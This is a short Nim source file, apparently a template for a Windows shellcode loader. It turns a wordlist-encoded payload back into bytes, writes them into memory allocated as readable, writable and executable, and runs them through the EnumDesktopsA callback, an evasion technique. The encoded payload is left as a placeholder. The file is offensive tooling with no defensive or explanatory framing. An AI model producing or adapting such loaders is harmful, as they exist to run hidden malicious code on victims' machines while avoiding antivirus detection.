import winim
import std/[strformat]

proc decodePayload(encodedSc, wordlist: seq[string]): seq[byte] =
  var decodedSc: seq[byte]
  for word in encodedSc:
    decodedSc.add(cast[byte](wordlist.find(word)))
  return decodedSc

proc main() = 
  #[ 
    output of main.nim goes here
  ]#
  var buf = decodePayload(enc, wl)

  var p = VirtualAlloc(NULL, sizeof(buf).DWORD, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  for i in buf.low .. buf.high:
    copyMem(p, addr buf[i], 1)
    p = cast[LPVOID](cast[int](p) + 1) 
  echo &"p at: {cast[int](p).toHex}"
  
  p = cast[LPVOID](cast[int](p) - buf.len) 
  EnumDesktopsA(GetProcessWindowStation(), cast[DESKTOPENUMPROCA](p), cast[LPARAM](NULL))


when isMainModule:
  main()